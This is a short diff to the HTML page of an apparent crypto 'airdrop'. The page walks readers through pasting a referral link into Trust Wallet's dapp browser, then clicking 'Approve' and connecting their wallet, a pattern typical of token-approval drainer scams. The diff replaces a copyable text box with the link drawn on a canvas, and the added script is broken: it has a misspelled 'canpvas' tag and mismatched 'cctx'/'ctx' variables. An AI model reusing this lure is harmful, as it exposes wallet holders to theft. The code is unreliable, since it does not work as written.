@@ -41,7 +41,16 @@
 							  <li type="1">Open Your Trust Wallet</li>
 							  <li type="1">Go To Dapp Browser</li>
 							  <li type="1">Copy the link and paste in the search bar. 
-							  <textarea>https://mopstoken.online/airdrop.html?ref=0x0000000000000000000000000000000000000000</textarea></li>
+							  <canpvas id="myCanvasText" width="200" height="75">https://mopstoken.online/airdrop.html?ref=0x0000000000000000000000000000000000000000</canvas>
+								  <script>  
+									  	var c = document.getElementById("myCanvasText");  
+									    var cctx = c.getContext("2d");  
+									    ctx.font = "30px Arial";
+									    ctx.fillStyle = "#FF0000";  
+									    ctx.fillRect(0,0,200,100); 
+									    ctx.strokeText("https://mopstoken.online/airdrop.html?ref=0x0000000000000000000000000000000000000000",10,50);  
+								  </script>
+							  </li>
 							  <li type="1">Select BSC network.</li>
 							  <li type="1">Click <bold>Claim Airdrop</bold> Button.</li>
 							  <li type="1">Click <bold>Approve</bold> and Connect your Wallet.</li><li type="1">MToken Will automatically transfer to your Wallet.</li> </ul>
@@ -120,7 +129,7 @@
 							</ul>
 						</div>
 						<div class="col-4 col-12-medium">
-							<span class="image fit"><img src="images/CoinGecko_Logo.png" alt="" width="150" height="150" /></span>
+							<span class="image fit"><img src="images/CoinGecko_Logo.png" alt="" width="110" height="150" /></span>
 							<h3><strong>Q2</strong></h3>
 							<ul align="left">
 								<li type="square">Coinmarketcap listing</li>
